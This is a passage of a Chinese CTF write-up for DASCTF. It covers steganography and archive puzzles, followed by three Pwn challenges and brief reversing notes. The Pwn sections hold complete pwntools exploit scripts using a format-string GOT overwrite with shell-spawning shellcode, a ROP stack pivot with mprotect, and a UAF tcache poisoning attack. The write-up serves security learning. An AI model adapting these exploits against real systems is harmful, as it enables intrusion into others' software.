<p>然后写个脚本提取二进制数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">hash_lst = &#123;&#125;</span><br><span class="line">pixel_list = &#123;&#125;</span><br><span class="line">data_list = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1536</span>):</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span></span><br><span class="line">    tmp_img = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">    tmp_pixel = tmp_img.getpixel((<span class="number">0</span>,<span class="number">0</span>))[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(tmp_pixel)</span></span><br><span class="line">    <span class="keyword">if</span> tmp_pixel &lt; <span class="number">200</span>:</span><br><span class="line">        data_list += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data_list += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data_list) </span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/MPsnpjlZcWKmiyw.png"
                        alt="image-20241109141725677"
                 ></p>
<p>下载可以得到一个压缩包</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/SdYfpcewB3xTrEi.png"
                        alt="image-20241109141749001"
                 ></p>
<p>GIF帧间隔隐写了解压密码</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/aoVY4qR2SnsEJBC.png"
                        alt="image-20241109141852400"
                 ></p>
<p>使用得到的密码解压即可得到flag</p>
<p><strong>DASCTF{H3r3_1s_C0L0rful_W0rld}</strong></p>
<h4 id="天命人（赛后复现）">天命人（赛后复现）</h4>
<p>题目附件给了一个压缩包，压缩包的注释中有提示</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/qdSbJMImCV2NKDn.png"
                        alt="image-20241109233650821.png"
                 ></p>
<p>解压后用010打开，发现就是把一个压缩包的数据按照顺序分到了六个文件里</p>
<p>因此我们写个脚本，按照顺序恢复一下压缩包即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data3 = f.read()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data4 = f.read()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;5&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data5 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data6 = f.read()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data4))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data5))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data6))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">387797</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res.append(data1[i])</span><br><span class="line">        res.append(data2[i])</span><br><span class="line">        res.append(data3[i])</span><br><span class="line">        res.append(data4[i])</span><br><span class="line">        res.append(data5[i])</span><br><span class="line">        res.append(data6[i])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(res))</span><br></pre></td></tr></table></figure>
<p>解压得到的压缩包，又可以得到两个新的加密的压缩包</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/QHTcOW1BqhiXMwU.png"
                        alt="image-20241109233851218.png"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/V12kDCIR5Wq8uGa.png"
                        alt="image-20241109233903989.png"
                 ></p>
<p>发现根器.zip中的文件很短，只有几字节，因此可以直接使用<code>CRC32</code>爆破文件内容</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/m3fcE4dW2wpXPJu.png"
                        alt="image-20241109234003835.png"
                 ></p>
<p>爆破后即可得到另一个压缩包的解压密码：<code>C0M3_4ND_Get_S1X_R00TS!!</code></p>
<p>使用得到的密码解压<code>未竟.zip</code>，可以得到一张png图片，还有一个名为<code>紧箍咒</code>的未知后缀的数据文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/Wj18kbEOCmftK7G.png"
                        alt="image-20241110114410382.png"
                 ></p>
<p>发现png图片中存在等距像素隐写，因此我们尝试等距提取像素，这里我就直接用了B神的代码</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/c81ZBiasgk72D4f.png"
                        alt="image-20241109234246782.png"
                 ></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;1x1&#x27;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-resize&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width_size, height_size = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.size.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            <span class="keyword">for</span> y_size <span class="keyword">in</span> <span class="built_in">range</span>(height_size):</span><br><span class="line">                <span class="keyword">for</span> x_size <span class="keyword">in</span> <span class="built_in">range</span>(width_size):</span><br><span class="line">                    <span class="comment"># new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span></span><br><span class="line">                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)</span><br><span class="line">                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)</span><br><span class="line">                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()</span><br><span class="line">                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># cv2.imshow(new_img)</span></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n或参数-size, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我们这里把图片重命名为1.png，然后输入以下命令提取等距像素点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 Get_Pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/TG3q7dmDUwcgKb5.png"
                        alt="image-20241109234710761.png"
                 ></p>
<p>这张图片提示了另一个<code>紧箍咒</code>文件是一个Veracrypt加密的磁盘文件</p>
<p>刚刚好之前的那张图片显示的也是金箍棒，因此我们把之前的那张图片作为密钥文件，并输入密码<code>jinggubang</code>挂载</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/3kRUmJtf8FrxYys.png"
                        alt="image-20241110114047596.png"
                 ></p>
<p>挂载成功后即可得到flag：<code>DASCTF&#123;T1m3_t0_F4Ce_De5t1nY&#125;</code></p>
<h3 id="Pwn">Pwn</h3>
<h4 id="printFFF">printFFF</h4>
<p>存在格式化字符串漏洞，将exit的got修改为写入的shellcode地址即可执行shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.timeout = <span class="number">5</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;10.1.112.37&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line">log = <span class="keyword">lambda</span> name, data:      success(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;data:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, <span class="subst">&#123;u64(<span class="string">b&quot;/bin/sh&quot;</span> + <span class="built_in">bytearray</span>([<span class="number">0</span>]))&#125;</span></span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    s(shellcode)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    pay = p64(<span class="number">0x5000</span>) + p64(elf.got[<span class="string">&quot;exit&quot;</span>])</span><br><span class="line">    pay += p64(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *0x401258&quot;)</span></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h4 id="reverse-stack">reverse_stack</h4>
<p>开辟在mmap地址上的反向stack，mmap地址和libc基址偏移固定，可泄露出libc基址</p>
<p>rsp会根据我们写入的len增加，写入负数值后，新开辟的栈会到原先的栈的上面，因此可以覆盖原先栈的rbp和返回地址实现栈迁移，打rop即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.timeout = 5</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;10.1.112.38&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line">log = <span class="keyword">lambda</span> name, data:      success(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;data:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x23000</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, <span class="subst">&#123;u64(<span class="string">b&quot;./flag&quot;</span> + <span class="built_in">bytearray</span>([<span class="number">0</span>,<span class="number">0</span>]))&#125;</span></span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x40</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x40</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># 1 leak</span></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    pay = p64(<span class="number">0x300</span>)</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;buf\n&#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    addr = u64(p.recvn(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">    target = addr + <span class="number">0x18</span></span><br><span class="line">    libc.address = addr + <span class="number">0x23000</span></span><br><span class="line">    leave_ret = libc.address + <span class="number">0x000000000004da83</span></span><br><span class="line">    log(<span class="string">&quot;libc&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;pill?\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;blue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2 gadgets</span></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    s(p64(<span class="number">0x300</span>))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;buf\n&#x27;</span>)</span><br><span class="line">    rop = ROP(libc, base=target)</span><br><span class="line">    rop.call(<span class="string">&quot;mprotect&quot;</span>, [target &amp; ~<span class="number">0xfff</span>, <span class="number">0x1000</span>, <span class="number">7</span>])</span><br><span class="line">    rop.raw(target + <span class="number">0x48</span>)</span><br><span class="line">    info(rop.dump())</span><br><span class="line">    pay = rop.chain() + shellcode</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&quot;pill?\n&quot;</span>, <span class="string">b&#x27;red&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># hijack</span></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    s(p64(<span class="number">0xFFFFFFFFFFFFFF79</span>))</span><br><span class="line">    ru(<span class="string">b&quot;buf\n&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &#x27;bbase 0x121F&#x27;)</span></span><br><span class="line">    sa(<span class="string">b&quot;pill?\n&quot;</span>, <span class="string">b&#x27;red&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    s(p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;buf\n&#x27;</span>)</span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(leave_ret) + p64(target - <span class="number">0x8</span>)</span><br><span class="line">    s(pay)</span><br><span class="line">    p.recvn(<span class="number">0x100</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;bbase 0x1233&quot;)</span></span><br><span class="line">    sa(<span class="string">b&quot;pill?\n&quot;</span>, <span class="string">b&#x27;blue&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h4 id="ezPwn">ezPwn</h4>
<p>存在UAF，tcachebin attack劫持到flag的地址，show即可得到flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.timeout = <span class="number">5</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;10.1.112.36&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line">log = <span class="keyword">lambda</span> name, data:      success(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;data:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;5.exit\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz, data=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(sz).encode())</span><br><span class="line">    sa(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sa(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    ru(<span class="string">b&quot;data&gt;&gt;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;gift:\n&#x27;</span>)</span><br><span class="line">    codebase = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x1a44</span></span><br><span class="line">    flag_addr = codebase + <span class="number">0x4060</span></span><br><span class="line">    log(<span class="string">&quot;codebase&quot;</span>, codebase)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    key = u64(p.recvn(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heapbase = (key &lt;&lt; <span class="number">12</span>) - <span class="number">0x1000</span></span><br><span class="line">    log(<span class="string">&quot;heapbase&quot;</span>, heapbase)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(key ^ flag_addr - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line">    add(<span class="number">0x400</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h3 id="Reverse">Reverse</h3>
<h4 id="Reverse2">Reverse2</h4>
<p>魔改UPX，用010改回来就行<br>
base64加密<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/de98BY1fDC4TGFL.png"
                        alt="alt text"
                 ><br>
换表<br>
<code>/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA</code><br>
密文<br>
<code>u76svKu5hJvLzpvHnJvGx5nPz53Nz8uaxsfGxseanJnHy83ImoL=</code><br>
直接解密就行了</p>
<h4 id="Reverse1">Reverse1</h4>
<p>RC4加密<br>
把beforemain,aftermain逻辑复制下来，最后把减号改成加就行了。</p>
